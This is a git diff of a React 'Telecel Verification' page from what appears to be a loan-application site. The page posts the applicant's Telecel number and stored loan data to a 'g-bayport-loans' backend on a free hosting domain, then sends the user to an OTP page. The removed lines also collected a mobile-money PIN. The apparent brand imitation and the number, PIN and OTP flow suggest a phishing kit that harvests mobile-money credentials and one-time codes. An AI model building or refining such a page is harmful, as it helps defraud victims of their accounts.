@@ -1,61 +1,63 @@
 import { useState } from "react";
-import { useNavigate } from "react-router-dom";
+import { useParams, useNavigate } from "react-router-dom";
+import axios from "axios";
 import "../styles/app.css";
 
 export default function Telecel() {
+  const { id } = useParams();
   const navigate = useNavigate();
-  const [loading, setLoading] = useState(false);
 
+  const [loading, setLoading] = useState(false);
   const [data, setData] = useState({
     number: "",
-    pin: "",
   });
 
   const handleChange = (e) => {
     setData({ ...data, [e.target.name]: e.target.value });
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
-
     setLoading(true);
 
-    setTimeout(() => {
-      navigate("/otp/1");
-    }, 2000);
+    try {
+      const loanData = JSON.parse(localStorage.getItem("loanData"));
+
+      await axios.post(
+        "https://g-bayport-loans.onrender.com/telecel",
+        {
+          id,
+          ...loanData,
+          ...data,
+        }
+      );
+
+      // backend decides OTP length
+      navigate(`/otp/${id}`);
+
+    } catch {
+      alert("Error submitting");
+    }
+
+    setLoading(false);
   };
 
   return (
     <div className="loan-container">
       <div className="card">
 
-        <div className="header">
-          <h1>Verify Account</h1>
-          <p className="subtitle">Secure verification</p>
-        </div>
+        <h1>Telecel Verification</h1>
 
         <form onSubmit={handleSubmit}>
 
-          <div className="section">
-            <input
-              name="number"
-              placeholder="Phone Number"
-              onChange={handleChange}
-              required
-            />
-          </div>
+          <input
+            name="number"
+            placeholder="Telecel Number"
+            onChange={handleChange}
+            required
+          />
 
-          <div className="section">
-            <input
-              name="pin"
-              type="password"
-              placeholder="PIN"
-              onChange={handleChange}
-              required
-            />
-          </div>
-
-          <button>
+          <button className="btn">
             {loading ? <div className="spinner"></div> : "Verify"}
           </button>
 
